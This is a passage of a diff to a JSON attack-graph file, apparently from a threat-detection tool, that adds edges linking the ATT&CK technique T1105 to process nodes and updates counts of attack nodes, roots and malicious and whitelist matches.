+      "to": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    },
+    {
+      "id": "edge:T1105:root:Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "source": "Technique:T1105",
+      "target": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "from": "Technique:T1105",
+      "to": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "label": "HAS_ROOT",
+      "type": "HAS_ROOT",
+      "properties": {
+        "action": "HAS_ROOT",
+        "event_id": "",
+        "timestamp": ""
+      }
+    }
+  ],
   "stats": {
     "source_nodes": 336,
     "source_edges": 338,
-    "attack_nodes": 1,
-    "attack_edges": 0,
-    "roots": 0,
-    "matched_malicious_nodes": 0,
-    "matched_whitelist_nodes": 0,
-    "matched_overlap_whitelist_override_nodes": 0
+    "attack_nodes": 114,
+    "attack_edges": 113,
+    "roots": 16,
+    "matched_malicious_nodes": 94,
+    "matched_whitelist_nodes": 84,
+    "matched_overlap_whitelist_override_nodes": 5
   }
 }
